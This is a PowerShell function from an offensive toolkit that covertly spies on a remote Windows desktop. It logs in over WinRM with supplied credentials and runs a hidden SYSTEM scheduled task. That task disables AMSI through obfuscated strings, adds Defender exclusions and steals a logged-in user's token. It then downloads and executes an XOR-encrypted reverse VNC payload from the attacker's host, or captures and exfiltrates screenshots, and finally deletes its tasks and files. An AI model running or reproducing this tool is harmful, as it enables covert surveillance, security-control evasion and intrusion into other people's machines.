function Invoke-StealthScreen {
    Param(
        [Parameter(Mandatory)] $Target,
        [Parameter(Mandatory)] $User,
        [Parameter(Mandatory)] $Pass,
        $Mode = 'view',
        $AttackerIP,
        $Port = 5500,
        $Password = 'AutoRDPw',
        $Path = 'C:\Windows\Temp',
        $HttpPort = 8081,
        [switch] $ViewOnly = $false,
        [switch] $VerboseLog = $false
    )

    $ErrorActionPreference = 'Stop'

    # Runtime artifacts stay inside the repository (excluded folder), never outside it.
    $tools = Join-Path (Split-Path $PSScriptRoot -Parent) 'Tools'
    if (!(Test-Path $tools)) { New-Item -ItemType Directory -Path $tools -Force | Out-Null }

    function New-B64([string]$text) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text)) }

    $cs = @'
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("kernel32.dll")] public static extern UInt32 WTSGetActiveConsoleSessionId();
    [DllImport("wtsapi32.dll", SetLastError=true)] public static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr Token);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool CreateProcessAsUserW(IntPtr hToken, IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInformation);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags;
        public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
}
'@

    # The string "AmsiUtils"/"amsiInitFailed" is assembled from char codes so it
    # never appears in plaintext in the task argument.
    $amsi = @'
try {
  $a = -join [char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e)
  $t = $a + (-join [char[]](0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73))
  $f = -join [char[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)
  [Ref].Assembly.GetType($t).GetField($f,'NonPublic,Static').SetValue($null,$true)
} catch { }
'@

    function New-ParentPayload([string]$childB64) {
        $tpl = @"
`$ErrorActionPreference = 'SilentlyContinue'
try { Add-MpPreference -ExclusionPath 'C:\Windows\Temp','C:\ProgramData' } catch { }
$amsi
try { Add-Type -TypeDefinition @'
$cs
'@ } catch { }
`$sessId = [WTS]::WTSGetActiveConsoleSessionId()
`$tok = [IntPtr]::Zero
`$q = `$false
try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok) } catch { }
if (`$q) { `$dup = [IntPtr]::Zero; if ([WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup)) { `$tok = `$dup } }
if (!`$q) {
    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1
    if (`$wl) { `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id); if (`$h -ne [IntPtr]::Zero) { `$null = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok) } }
}
`$si = New-Object WTS+STARTUPINFO
`$si.cb = [Runtime.InteropServices.Marshal]::SizeOf(`$si)
`$si.lpDesktop = 'WinSta0\Default'
`$cmd = 'powershell.exe -nop -w hidden -e $childB64'
`$pi = New-Object WTS+PROCESS_INFORMATION
`$ptrSi = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(`$si))
[Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)
`$ptrPi = [Runtime.InteropServices.Marshal]::AllocHGlobal(24)
[Runtime.InteropServices.Marshal]::Copy((New-Object byte[] 24), 0, `$ptrPi, 24)
`$cp = [Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmd)
`$null = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)
"@
        return $tpl
    }

    function Start-RemotePayload {
        Param([string]$text, [string]$taskName)
        $enc = New-B64 $text
        invoke-command -session $s -scriptblock {
            Param($enc, $name)
            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-nop -w hidden -e $enc"
            Register-ScheduledTask -TaskName $name -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force | Out-Null
            Start-ScheduledTask -TaskName $name
        } -ArgumentList $enc, $taskName
    }

    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
    if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }

    if ($Mode -eq 'view') {
        if (!$AttackerIP) { Write-Host "[!] -AttackerIP required for view mode" -ForegroundColor Red; Remove-PSSession $s; return }

        $viewer = Get-Process VNCViewer -ErrorAction SilentlyContinue
        if (!$viewer) {
            $exe = Join-Path $tools 'VNCViewer.exe'
            if (!(Test-Path $exe)) {
                Push-Location $tools
                try {
                    if ($PSScriptRoot -and (Test-Path (Join-Path $PSScriptRoot 'Invoke-VNCViewer.ps1'))) {
                        & (Join-Path $PSScriptRoot 'Invoke-VNCViewer.ps1')
                    } else {
                        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
                    }
                } finally { Pop-Location }
            }
            $listenerArgs = "/listen $Port /password $Password /nohotkeys /autoacceptincoming"
            if ($ViewOnly) { $listenerArgs += " /viewonly" }
            Start-Process -FilePath $exe -ArgumentList $listenerArgs | Out-Null
            Start-Sleep -Seconds 2
        }
        Write-Host "[+] Handler on ${AttackerIP}:$Port - staging payload over HTTP port $HttpPort" -ForegroundColor Blue

        if (!(Test-Path (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1'))) {
            Write-Host "[!] Invoke-VNCServer.ps1 missing next to the module" -ForegroundColor Red
            Remove-PSSession $s; return
        }
        $vncps = [IO.File]::ReadAllText((Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1'))
        $flat = ($vncps -replace '\s', '')
        $chars = $flat.ToCharArray()
        [Array]::Reverse($chars)
        $fn = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(-join $chars))
        $body = $fn + "`r`nInvoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password`r`n"

        $key = New-Object byte[] 16
        [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
        $tb = [Text.Encoding]::UTF8.GetBytes($body)
        $xb = New-Object byte[] $tb.Length
        for ($i = 0; $i -lt $tb.Length; $i++) { $xb[$i] = $tb[$i] -bxor $key[$i % 16] }

        $blobPath = Join-Path $tools 'payload.bin'
        [IO.File]::WriteAllBytes($blobPath, $xb)

        $keyLit = ($key | ForEach-Object { '0x{0:X2}' -f $_ }) -join ','
        $loader = @"
`$ErrorActionPreference = 'SilentlyContinue'
$amsi
`$k = @($keyLit)
`$b = `$null
try { `$b = (New-Object Net.WebClient).DownloadData('http://${AttackerIP}:$HttpPort/v') } catch { }
if (`$b) { for (`$i = 0; `$i -lt `$b.Length; `$i++) { `$b[`$i] = `$b[`$i] -bxor `$k[`$i % 16] }; iex ([Text.Encoding]::UTF8.GetString(`$b)) }
"@

        $serverJob = Start-Job -ScriptBlock {
            Param($port, $path, $seconds)
            $data = [IO.File]::ReadAllBytes($path)
            $l = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, $port)
            try { $l.Start() } catch { return }
            $end = (Get-Date).AddSeconds($seconds)
            while ((Get-Date) -lt $end) {
                if ($l.Pending()) {
                    try {
                        $c = $l.AcceptTcpClient()
                        $ns = $c.GetStream()
                        $ns.ReadTimeout = 3000
                        $buf = New-Object byte[] 2048
                        try { $null = $ns.Read($buf, 0, 2048) } catch { }
                        $hdr = "HTTP/1.1 200 OK`r`nContent-Type: application/octet-stream`r`nContent-Length: $($data.Length)`r`nConnection: close`r`n`r`n"
                        $hb = [Text.Encoding]::ASCII.GetBytes($hdr)
                        $ns.Write($hb, 0, $hb.Length)
                        $ns.Write($data, 0, $data.Length)
                        $ns.Flush()
                        $c.Close()
                    } catch { }
                }
                Start-Sleep -Milliseconds 150
            }
            $l.Stop()
        } -ArgumentList $HttpPort, $blobPath, 120

        $taskName = 'W' + (-join (1..8 | ForEach-Object { '{0:X}' -f (Get-Random -Maximum 16) }))
        Start-RemotePayload -text (New-ParentPayload (New-B64 $loader)) -taskName $taskName

        $conn = $false
        for ($i = 0; $i -lt 10; $i++) {
            Start-Sleep -Seconds 4
            $est = netstat -ano | Select-String ":$Port\s.*ESTABLISHED"
            if ($est) { $conn = $true; break }
        }
        if ($conn) { Write-Host "[+] VNC session ESTABLISHED on port $Port" -ForegroundColor Green }
        else { Write-Host "[i] No ESTABLISHED after 40s - check target reachability to ${AttackerIP}:$HttpPort" -ForegroundColor Yellow }

        invoke-command -session $s -scriptblock {
            Param($name)
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -Force -ErrorAction SilentlyContinue
            sc.exe stop WinShotSvc | Out-Null; sc.exe stop WinSessionSvc | Out-Null
            sc.exe delete WinShotSvc | Out-Null; sc.exe delete WinSessionSvc | Out-Null
            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vncb64.txt','C:\Windows\Temp\vnc.ps1','C:\Windows\Temp\vnclog.txt' -Force -ErrorAction SilentlyContinue
        } -ArgumentList $taskName

        Stop-Job $serverJob -ErrorAction SilentlyContinue | Out-Null
        Remove-Job $serverJob -Force -ErrorAction SilentlyContinue
        Remove-Item $blobPath -Force -ErrorAction SilentlyContinue
    }

    if ($Mode -eq 'shot') {
        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue

        $shotName = 'ss{0}.png' -f (Get-Random -Maximum 99999)
        $shotFile = Join-Path $Path $shotName
        $shotCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; try { Add-MpPreference -ExclusionPath '$Path' -ErrorAction SilentlyContinue } catch { }; New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; `$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; `$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; `$g = [System.Drawing.Graphics]::FromImage(`$bmp); `$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); `$bmp.Save('$shotFile'); `$g.Dispose(); `$bmp.Dispose()"

        $shotChild = "`$ErrorActionPreference = 'SilentlyContinue'`r`n$amsi`r`n$shotCmd`r`n"
        $taskName = 'W' + (-join (1..8 | ForEach-Object { '{0:X}' -f (Get-Random -Maximum 16) }))
        Start-RemotePayload -text (New-ParentPayload (New-B64 $shotChild)) -taskName $taskName

        $res = $null
        for ($i = 0; $i -lt 6; $i++) {
            Start-Sleep -Seconds 4
            $res = invoke-command -session $s -scriptblock {
                Param($f)
                if (Test-Path $f) { [Convert]::ToBase64String([IO.File]::ReadAllBytes($f)) }
            } -ArgumentList $shotFile
            if ($res) { break }
        }

        invoke-command -session $s -scriptblock {
            Param($name, $f)
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -Force -ErrorAction SilentlyContinue
            Remove-Item $f,'C:\Windows\Temp\ss.ps1' -Force -ErrorAction SilentlyContinue
        } -ArgumentList $taskName, $shotFile

        if ($res) {
            $out = Join-Path $tools 'stealthshot.png'
            [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($res))
            Write-Host "[+] Screen captured: $out" -ForegroundColor Green
            Invoke-Item $out
        } else {
            Write-Host "[!] No screenshot arrived" -ForegroundColor Red
        }
    }

    Remove-PSSession $s
}
